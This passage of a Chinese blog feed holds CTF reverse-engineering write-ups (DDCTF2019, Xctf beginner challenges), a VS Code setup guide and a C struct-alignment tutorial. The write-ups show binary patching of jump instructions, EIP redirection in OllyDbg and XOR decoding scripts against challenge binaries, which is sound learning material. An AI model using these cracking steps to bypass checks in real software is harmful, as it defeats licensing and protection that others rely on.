edi  unsigned int result; // eax  const char *v4; // ebx  i = 0;  result = strlen(a1);  if ( result )  {    v4 = (a1 - v1);    do    {      *v1 = byte_402FF8[v1[v4]];      ++i;      ++v1;      result = strlen(a1);    }    while ( i &lt; result );  }  return result;}</code></pre><p>可以看出来输入的东西的确在这里进行了，一位位的处理。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858421447.jpg" srcset="/img/loading.gif" alt="-w521"><br>用这里的字符串进行了替换。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858895484.jpg" srcset="/img/loading.gif" alt="-w917"><br>但是跳转查看发现没什么东西，发现最下方一段不知道有什么用的字符串。静态分析至此，没什么思路了。用od来看看我们输入的字符串会变成什么样。</p><h3 id="OD动态分析"><a href="#OD动态分析" class="headerlink" title="OD动态分析"></a>OD动态分析</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739860730789.jpg" srcset="/img/loading.gif" alt="-w555"><br>定位在这个字符串之前应该就可以看到我们输入后被处理后的字符串。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739861642584.jpg" srcset="/img/loading.gif" alt="-w1006"><br>在前面一个函数进行下断点，也可以清楚看到他就是我们刚刚说的加密函数<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862054229.jpg" srcset="/img/loading.gif" alt="-w334"><br>这就是一个地址。然后我们输入123测试<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862667897.jpg" srcset="/img/loading.gif" alt="-w361"><br>已经穿进eax。<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739863094523.jpg" srcset="/img/loading.gif" alt="-w1199"><br>直接F8不进入函数内部，因为我们的目的就看怎么处理了我们输入的字符串。发现变成了<code>mlk</code>。<br>查看下对应的ASCIL:<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739864384097.jpg" srcset="/img/loading.gif" alt="-w544"><br><strong>可以明显发现处理前的字符与处理后的字符相加都等于158</strong>。</p><h3 id="脚本解密"><a href="#脚本解密" class="headerlink" title="脚本解密"></a>脚本解密</h3><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    char arr[]=&quot;DDCTF{reverseME}&quot;;    for (int i = 0; i &lt; strlen(arr); i++)    {        arr[i]=158-arr[i];    }    printf(&quot;%s&quot;,arr);    }</code></pre><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865575323.jpg" srcset="/img/loading.gif" alt="-w250"><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865898152.jpg" srcset="/img/loading.gif" alt="-w437"><br><strong>%是VC编译的字符串结束标志不用代入。</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在某在题目中，静态分析加密函数有些困难的时候，往往没有动态分析来的快，感觉动静结合分析是很好的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vscode的简单调教</title>
    <link href="/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/"/>
    <url>/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Vscode的简单调教"><a href="#Vscode的简单调教" class="headerlink" title="Vscode的简单调教"></a>Vscode的简单调教</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>VScode是比较适合自己使用的，因为非常的简洁且不臃肿，拓展性还好。并且自己常写代码是就是为了输入输出实现某些功能，基本用不到调试功能。但碍于难以配置各种环境，一直没有用上，失败了很多次。现在又学着整了一下，现在已经吃上了vscode的香。写个博客，记录一下，也可以分析下经验。</p><h2 id="正常设置"><a href="#正常设置" class="headerlink" title="正常设置"></a>正常设置</h2><p><img src="/2019/11/15/Vs code的简单调教/images/15737872236921.jpg" srcset="/img/loading.gif" alt="-w143"></p><p>在这里点击完设置以后，会出现：<br><img src="/2019/11/15/Vs code的简单调教/images/15737872693861.jpg" srcset="/img/loading.gif" alt="-w791"><br>在这里可以设置vscode的各种地方，就如图中一样，需要自己探索一下，然后设置成自己想要的结果。</p><h2 id="配置编译环境"><a href="#配置编译环境" class="headerlink" title="配置编译环境"></a>配置编译环境</h2><p>这里我只用到c/c++和Python就只记录这个了。<br><img src="/2019/11/15/Vs code的简单调教/images/15737878495576.jpg" srcset="/img/loading.gif" alt="-w449"><br>输入C/C++<br><img src="/2019/11/15/Vs code的简单调教/images/15737879247492.jpg" srcset="/img/loading.gif" alt="-w676"><br>在这里进行点个install。<br>PYthon也是同样的操作。</p><h2 id="让代码跑起来"><a href="#让代码跑起来" class="headerlink" title="让代码跑起来"></a>让代码跑起来</h2><p>在应用商店里搜索<strong>Code Runner</strong>。<br><img src="/2019/11/15/Vs code的简单调教/images/15737881342794.jpg" srcset="/img/loading.gif" alt="-w653"><br>这个是个神器，有了它就可以在vscode直接运行各种代码。<br>安装好后把vscode关闭，然后重新打开。</p><h3 id="新建个C-C-文件："><a href="#新建个C-C-文件：" class="headerlink" title="新建个C/C++文件："></a>新建个C/C++文件：</h3><p><img src="/2019/11/15/Vs code的简单调教/images/15737885382202.jpg" srcset="/img/loading.gif" alt="-w677"><br>然后右键<br><img src="/2019/11/15/Vs code的简单调教/images/15737886009237.jpg" srcset="/img/loading.gif" alt="-w287"><br>是可以运行代码的。<br>在右上角：<br><img src="/2019/11/15/Vs code的简单调教/images/15737886490345.jpg" srcset="/img/loading.gif" alt="-w305"><br>这个小三角也可以运行代码。看下效果：<br><img src="/2019/11/15/Vs code的简单调教/images/15737886695093.jpg" srcset="/img/loading.gif" alt="-w1007"></p><h3 id="更改为终端输出"><a href="#更改为终端输出" class="headerlink" title="更改为终端输出"></a>更改为终端输出</h3><p>我们改一下代码：<br>    #include <iostream><br><br>    int main() {<br>        int a;<br>        scanf(“%d”,&amp;a);<br>        printf(“hello world!”);<br><br>    }</iostream></p><p>在这样直接运行后发现：<img src="/2019/11/15/Vs code的简单调教/images/15737890616864.jpg" srcset="/img/loading.gif" alt="-w1070"><br>卡在运行过程且我们无法输入：<br><img src="/2019/11/15/Vs code的简单调教/images/15737891086923.jpg" srcset="/img/loading.gif" alt="-w290"><br>这个解决办法就是<strong>更改为终端输出就可以了</strong>。<br><img src="/2019/11/15/Vs code的简单调教/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>点击配置扩展信息。下滑找到：<br><img src="/2019/11/15/Vs code的简单调教/images/15737893476953.jpg" srcset="/img/loading.gif" alt="-w559"><br>然后打个勾就可以了。<br>运行：<br><img src="/2019/11/15/Vs code的简单调教/images/15737894451238.jpg" srcset="/img/loading.gif" alt="-w677"><br>发现成功了，然后看下其原理就是帮你对终端进行了<br><code>cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test</code>这个命令的执行，发现其是用gcc进行了编译，mac是自带clang的，clang的优点挺多的，<strong>且支持语法错误的检测，</strong>然后就想着去改下让其用clang++来编译。</p><h3 id="自定义运行逻辑"><a href="#自定义运行逻辑" class="headerlink" title="自定义运行逻辑"></a>自定义运行逻辑</h3><p><img src="/2019/11/15/Vs code的简单调教/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>还是进入这个配置里面：<br><img src="/2019/11/15/Vs code的简单调教/images/15737897368419.jpg" srcset="/img/loading.gif" alt="-w411"><br>在settings.json中编辑:</p><pre><code>&quot;code-runner.executorMap&quot; : {       &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;,       &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;php&quot;: &quot;php&quot;,       &quot;python&quot;: &quot;python -u&quot;,       &quot;ruby&quot;: &quot;ruby&quot;,   }</code></pre><h4 id="成品："><a href="#成品：" class="headerlink" title="成品："></a>成品：</h4><p><img src="/2019/11/15/Vs code的简单调教/images/15737900505196.jpg" srcset="/img/loading.gif" alt="-w1110"><br>直接粘贴这段代码放入这里面保存就可以了。</p><h4 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h4><p><img src="/2019/11/15/Vs code的简单调教/images/15737901558381.jpg" srcset="/img/loading.gif" alt="-w860"><br>实现我们的目的了。</p><h3 id="测试一下Python"><a href="#测试一下Python" class="headerlink" title="测试一下Python"></a>测试一下Python</h3><p>这是直接新建的：<br><img src="/2019/11/15/Vs code的简单调教/images/15737904131858.jpg" srcset="/img/loading.gif" alt="-w430"><br><img src="/2019/11/15/Vs code的简单调教/images/15737904322136.jpg" srcset="/img/loading.gif" alt="-w465"><br>这样就可以一个vscode运行各种代码，对于不是专门做开发，只是写脚本的，就是个福音。</p>]]></content>
    
    
    
    <tags>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（五）</title>
    <link href="/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（五）"><a href="#C语言与反汇编学习（五）" class="headerlink" title="C语言与反汇编学习（五）"></a>C语言与反汇编学习（五）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是记录一下，在学习过程中认为容易忘记且重要的东西，方便以后忘了再来学习一下。<strong>集中于结构体部分以及结构体对齐的知识。</strong></p><h2 id="结构体的使用练习"><a href="#结构体的使用练习" class="headerlink" title="结构体的使用练习"></a>结构体的使用练习</h2><p>1、定义一个结构体Gamer用来存储一个游戏中的角色的信息，包括血值、等级、坐标等信息    。<br>要求：<br>    (1) 具体包含哪些信息自由设计<br>    (2) 但这些包含的类型中，必须要有一个成员是结构体类型。<br>    2、定义一个函数，用来给这个结构体变量赋值.<br>3、定义一个函数，用来显示这个结构体变量的所有成员信息.<br>    #include <iostream><br>    #include &lt;stdio.h&gt;<br>    #include &lt;string.h&gt;<br>    struct point<br>    {<br>        int x;<br>        int y;<br>        int z;<br>    };<br>    struct Gamer<br>    {<br>        char name[20];<br>        int level;<br>        float HP;<br>        point a;<br>    }No1;<br>    void Function()<br>    {<br>        char a[]=”xiaozhi”;<br>        for (int i = 0; i &lt;strlen(a) ; ++i) {<br>            No1.name[i]=a[i];<br>        }<br>        No1.level = 99;<br>        No1.HP = 99.9;<br>        No1.a.x=6;<br>        No1.a.y=5;<br>        No1.a.z=9;<br>    }<br>    void Display()<br>    {<br>        printf(“name:%s level:%d HP:%f point:%d %d %d “,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z);<br>    }<br>    int main() {<br>        Function();<br>        Display();<br>        return 0;<br>    }</iostream></p><h2 id="sizeof的使用"><a href="#sizeof的使用" class="headerlink" title="sizeof的使用"></a>sizeof的使用</h2><h3 id="基本类型的sizeof"><a href="#基本类型的sizeof" class="headerlink" title="基本类型的sizeof"></a>基本类型的sizeof</h3><p>可以使用类型，也可以使用变量<br>例子：</p><p>printf(“%d\n”,sizeof(char));<br>printf(“%d\n”,sizeof(int));<br>printf(“%d\n”,sizeof(float));<br>printf(“%d\n”,sizeof(double));</p><p>int x = 10;            //变量<br>printf(“%d\n”,sizeof(x));        </p><h3 id="数组类型的sizeof"><a href="#数组类型的sizeof" class="headerlink" title="数组类型的sizeof"></a>数组类型的sizeof</h3><p>例子：<br>    char arr1[10] = {0};<br>    short arr2[10] = {0};<br>    int arr3[10] = {0};                </p><pre><code>printf(&quot;%d\n&quot;,sizeof(arr1));                //10printf(&quot;%d\n&quot;,sizeof(arr2));            //    20printf(&quot;%d\n&quot;,sizeof(arr3));            //    40printf(&quot;%d\n&quot;,sizeof(arr1[10]));            //    1printf(&quot;%d\n&quot;,sizeof(arr2[10]));            //    2printf(&quot;%d\n&quot;,sizeof(arr3[10]));                //4</code></pre><p>注意其中的不同。</p><h2 id="结构体（内存）对齐"><a href="#结构体（内存）对齐" class="headerlink" title="结构体（内存）对齐"></a>结构体（内存）对齐</h2><h3 id="为什么要有内存对齐？"><a href="#为什么要有内存对齐？" class="headerlink" title="为什么要有内存对齐？"></a>为什么要有内存对齐？</h3><p>本质：是要效率还是空间，二选一的结果.统称是性能，还有台移植等因素，编译器对数据结构进行了内存对齐。</p><h3 id="pragma-pack的基本用法"><a href="#pragma-pack的基本用法" class="headerlink" title="pragma pack的基本用法"></a>pragma pack的基本用法</h3><p>在vc6.0++中默认值是8字节对齐。</p><pre><code>    #pragma pack( n )    结构体。    #pragma pack(  )</code></pre><p>该操作会改变一个结构体的字节对齐数，这是针对编译器的。<br>对齐参数：n为字节对齐数，其取值为1、2、4、8，默认是8。<br>如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，<strong>即是说，结构体成员的偏移量应该取二者的最小值.</strong></p><pre><code>#pragma pack(n)            struct Test            {                 int a ;                 __int64 b ;                 char c ;            };            #pragma pack()            </code></pre><p>以下是各种情况的内存对齐分析:<br>1:1字节对齐<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735626712023.jpg" srcset="/img/loading.gif" alt="-w155"><br>2:2字节对齐时：<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735626990588.jpg" srcset="/img/loading.gif" alt="-w266"><br>3：4个字节对齐<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735627321430.jpg" srcset="/img/loading.gif" alt="-w381"><br>4、8个字节对齐</p><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735627463362.jpg" srcset="/img/loading.gif" alt="-w583"></p><h3 id="对齐原则："><a href="#对齐原则：" class="headerlink" title="对齐原则："></a>对齐原则：</h3><p>原则一：数据成员对齐规则：结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为４字节，则要从4的整数倍地址开始存储).                                    </p><p>原则二：结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。<br>原则三：如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。                                    <strong>(struct a里存有struct b，b里有char，int，double等元素，那b应该从8的整数倍开始存储.)</strong>                                    </p><p>原则四：对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准.<br>    也就是说，结构体成员的偏移量应该取二者的最小值.                                </p><p><strong>由浅入深，分析内存对齐原则后内存到底是怎么分配的</strong></p><h4 id="案例分析一："><a href="#案例分析一：" class="headerlink" title="案例分析一："></a>案例分析一：</h4><pre><code>struct Test                {                    char  a;                    int b ;                };                </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735632219948.jpg" srcset="/img/loading.gif" alt="-w671"><br><strong>sizeof(Test) =1+3（补齐的）+4=8(其中最大的4的整倍数)</strong></p><h4 id="案例二分析："><a href="#案例二分析：" class="headerlink" title="案例二分析："></a>案例二分析：</h4><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                    };                    </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735634186981.jpg" srcset="/img/loading.gif" alt="-w621"><br><strong>sizeof(Test) =4+4（补齐的）+8+1+7（补齐的）=24(其中最大的8的整倍数)</strong></p><h4 id="案例三分析："><a href="#案例三分析：" class="headerlink" title="案例三分析："></a>案例三分析：</h4><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                        char d ;                    };                    </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735635119907.jpg" srcset="/img/loading.gif" alt="-w662"></p><p><strong>sizeof(Test) =4+4（补齐的）+8+1+1+6（补齐的）=24(其中最大的8的整倍数)</strong></p><h4 id="案例四分析："><a href="#案例四分析：" class="headerlink" title="案例四分析："></a>案例四分析：</h4><pre><code>struct S1        {            char c;        double i;    };        </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735636051365.jpg" srcset="/img/loading.gif" alt="-w530"></p><p><strong>sizeof(S1) =1+7（补齐的）+8=16(其中最大的8的整倍数)</strong></p><h4 id="案例五分析："><a href="#案例五分析：" class="headerlink" title="案例五分析："></a>案例五分析：</h4><pre><code>struct S2        {            int c1;         char c2[10]; };    </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735636961393.jpg" srcset="/img/loading.gif" alt="-w547"></p><p><strong>sizeof(S2) =4+10+2（补齐的）=16(其中最大的8的整倍数)</strong></p><h4 id="案例六分析："><a href="#案例六分析：" class="headerlink" title="案例六分析："></a>案例六分析：</h4><pre><code>struct S3        {            char c1;         S1 s;            char c2;         char c3;     };</code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735637638057.jpg" srcset="/img/loading.gif" alt="-w539"></p><p><strong>sizeof(S3) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+1+6（补齐的）=32(其中最大的8的整倍数)</strong></p><h4 id="案例七分析："><a href="#案例七分析：" class="headerlink" title="案例七分析："></a>案例七分析：</h4><pre><code>struct S4        {            char c1;         S1 s;            char c2;         double c3;     };    </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735639114324.jpg" srcset="/img/loading.gif" alt="-w558"></p><p><strong>sizeof(S4) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+7（补齐的）+8=40(其中最大的8的整倍数)</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xctf\_RE新手区WP</title>
    <link href="/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
    <url>/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Xctf-RE新手区WP"><a href="#Xctf-RE新手区WP" class="headerlink" title="Xctf_RE新手区WP"></a>Xctf_RE新手区WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学c与反汇编学的有点疲倦了，且实际运用比较少，所以最近一周刷了很多的Re入门题，巩固知识且熟悉下ctf中的RE题目。</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>第一步，先查壳：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15732702605654.jpg" srcset="/img/loading.gif" alt="-w625"><br>（查壳很重要，可以先确认是否有壳还可以知道程序是什么语言编写的）<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733071101333.jpg" srcset="/img/loading.gif" alt="-w656"><br>看下程序是干嘛的，也就是你输入flag然后程序出个判断是否正确。<strong>估计就是个明文对比</strong>，直接od打开：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733074111357.jpg" srcset="/img/loading.gif" alt="-w911"><br>断在了re模块。直接搜索字符串<img src="/2019/11/09/Xctfre_新手区wp/images/15733075097915.jpg" srcset="/img/loading.gif" alt="-w673"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733072667813.jpg" srcset="/img/loading.gif" alt="-w801"><br>拿到flag</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>还是先查壳：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733077161080.jpg" srcset="/img/loading.gif" alt="-w519"><br>无壳<br>这道题有多种做法，下面展示三种：</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p><strong>这个做法主要是判断程序逻辑，然后改关键跳转的汇编代码，进行爆破破解。</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079095740.jpg" srcset="/img/loading.gif" alt="-w678"><br>先看下程序是做什么的：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079517175.jpg" srcset="/img/loading.gif" alt="-w545"><br>先输入个1<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079675395.jpg" srcset="/img/loading.gif" alt="-w507"><br>发现图案中第1，2，8行图形发生了变化。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733082372049.jpg" srcset="/img/loading.gif" alt="-w659"><br>接着输入2，然后第3，4，8行图形发生了变化。感觉没什么规律，大概猜一下，应该是这8行的线条全部连通就可以完成这个游戏。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733085847753.jpg" srcset="/img/loading.gif" alt="-w607"></p><h4 id="打开IDA进行静态分析"><a href="#打开IDA进行静态分析" class="headerlink" title="打开IDA进行静态分析"></a>打开IDA进行静态分析</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733087052533.jpg" srcset="/img/loading.gif" alt="-w489"><br>发现一堆函数难以找到主函数，按<code>shift+F12</code>查看字符串<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733088311433.jpg" srcset="/img/loading.gif" alt="-w909"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733088160599.jpg" srcset="/img/loading.gif" alt="-w865"><br>点击这个，查看一下这个字符串的交叉引用，然后可以双击跳转到main函数，看整个程序的逻辑。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733091045568.jpg" srcset="/img/loading.gif" alt="-w746"></p><p>跳转好后按F5查看伪代码：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733092783647.jpg" srcset="/img/loading.gif" alt="-w471"><br>在下方发现了一个判断语句，满足后会调用sub_45Ab4这个函数。双击进入看看这个函数做了什么：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733094560784.jpg" srcset="/img/loading.gif" alt="-w465"><br>发现会出现这个字符串，然后：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733094810614.jpg" srcset="/img/loading.gif" alt="-w387"><br>还经过一堆数据和异或后返回一个字符串。那这个应该就是返回flag了。<strong>那就是想办法让程序调用<code>sub_45Ab4</code>这个函数就可以了。</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733096364506.jpg" srcset="/img/loading.gif" alt="-w307"><br>再看一下这个if语句里面正好是对一个容量为8的数组进行判断，对应刚刚程序中的8行，正好对应当8行直线全部连接（也可以认为是图案全变）就会调用输出flag的函数。</p><p>那现在需要做的就很明确的，直接改程序流程，IDA的patch是可以做到的，结合刚刚我们输入1的时候回让1，2，8行进行改变，那我们就在这几处做改变就可以了。</p><h4 id="IDA-Patch"><a href="#IDA-Patch" class="headerlink" title="IDA Patch"></a>IDA Patch</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733100087904.jpg" srcset="/img/loading.gif" alt="-w423"><br>看主函数的流程图模式，专门找这个跳转指令JNZ，数一下8个就是刚刚的8个判断了。对应刚刚的想法我们在<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733100975029.jpg" srcset="/img/loading.gif" alt="-w394"><br>这几处的汇编代码进行patch：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733101571151.jpg" srcset="/img/loading.gif" alt="-w504"><br><strong>把JNZ改成正好相反的JZ</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733107484458.jpg" srcset="/img/loading.gif" alt="-w460"></p><p>修改好后查看下生成的伪代码<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733107946575.jpg" srcset="/img/loading.gif" alt="-w375"><br>达到了我们想要的结果。<br>然后我们需要把这些打patch的地方保存下来，让其成效：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733103617647.jpg" srcset="/img/loading.gif" alt="-w1324"><br>点击ok即可，可以为了安全选择一下做个bak备份。</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733108996551.jpg" srcset="/img/loading.gif" alt="-w564"><br>输入1<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733109139764.jpg" srcset="/img/loading.gif" alt="-w661"><br>拿到了flag。</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>这种主要是在IDA中静态分析后知道了，在程序调用输出flag函数后flag就打印出来了。就可以想办法在动态调试中直接调用这个函数就可以了。重在IDA和OD搭配使用了。</p><h4 id="IDA寻找输出flag函数的函数地址"><a href="#IDA寻找输出flag函数的函数地址" class="headerlink" title="IDA寻找输出flag函数的函数地址"></a>IDA寻找输出flag函数的函数地址</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733116649387.jpg" srcset="/img/loading.gif" alt="-w829"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733116800264.jpg" srcset="/img/loading.gif" alt="-w702"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733118131519.jpg" srcset="/img/loading.gif" alt="-w688"><br>记住这个0045E940 地址。下面OD直接想办法执行到该地址</p><h4 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733122639383.jpg" srcset="/img/loading.gif" alt="-w498"><br>发现基地址是010F<br>在OD中搜索字符串，找一下我们应该在哪个地方找一个合适的可以控制的代码段。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733124212188.jpg" srcset="/img/loading.gif" alt="-w692"><br>发现了输入n的语句地址。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733124483702.jpg" srcset="/img/loading.gif" alt="-w695"><br>设置一个断点，运行程序。F9让程序运行到这里断下来。按空格修改下汇编代码<code>jmp 0x010FE490</code><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733126763356.jpg" srcset="/img/loading.gif" alt="-w688"></p><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733126850272.jpg" srcset="/img/loading.gif" alt="-w205"><br>这时候的EIP，然后单步执行<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733127939834.jpg" srcset="/img/loading.gif" alt="-w869"><br>过来了，到了调用输出flag的函数。然后接下来会有很多循环和字符处理的操作，直接可以按CTRL+F8按键让OD自动执行。让把这个函数处理完，就会出现flag字符串。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733127636852.jpg" srcset="/img/loading.gif" alt="-w674"></p><p>这种修改EIP是重点和找到合适可控制代码段是重点，我们还可以<br>在找到一个可以控制代码后，在搜索字符串中找到<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733133763253.jpg" srcset="/img/loading.gif" alt="-w637"><br>单击过去，然后在这个函数的开头设置为新的EIP<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733132918043.jpg" srcset="/img/loading.gif" alt="-w622"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733134257814.jpg" srcset="/img/loading.gif" alt="-w208"><br>然后按一下F8就来到了这个函数里面了。再进行刚刚的操作就可以了。</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>这个就是我们找到了关键函数，分析以后是可以把这个函数是写出来的，然后根据伪代码写出原来的程序就可以了。</p><h4 id="OD静态分析"><a href="#OD静态分析" class="headerlink" title="OD静态分析"></a>OD静态分析</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733137173061.jpg" srcset="/img/loading.gif" alt="-w682"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733137433462.jpg" srcset="/img/loading.gif" alt="-w521"><br>调用其函数。双击进入F5生成伪代码：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733137975116.jpg" srcset="/img/loading.gif" alt="-w555"><br>（只是截取一部分）分析可以得知是分成了2个字符数组，一个V2到V58，一个V59到V115，都是56的长度，然后下面就是两个异或操作了。直接改成C代码，因为还不会写Python。</p><pre><code>#include &lt;iostream&gt;#include &lt;string.h&gt;int main() {        int i;        char arr1[]={123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0};        char arr2[]={18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0};        for ( i = 0; i &lt; 56; ++i )        {            arr1[i] ^= arr2[i];            arr1[i] ^= 0x13u;        }        printf(&quot;%s&quot;,arr1);    return 0;}</code></pre><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733139966832.jpg" srcset="/img/loading.gif" alt="-w734"><br>运行就拿到了flag。</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p>根据题目描述：菜鸡发现Flag似乎并不一定是明文比较的<br>肯定是进行了某种加密。</p><h3 id="先查壳"><a href="#先查壳" class="headerlink" title="先查壳"></a>先查壳</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733878960896.jpg" srcset="/img/loading.gif" alt="-w544"><br>无壳，32位c++程序</p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733879199369.jpg" srcset="/img/loading.gif" alt="-w431"><br>输入正确的serial，会提示正确。</p><h3 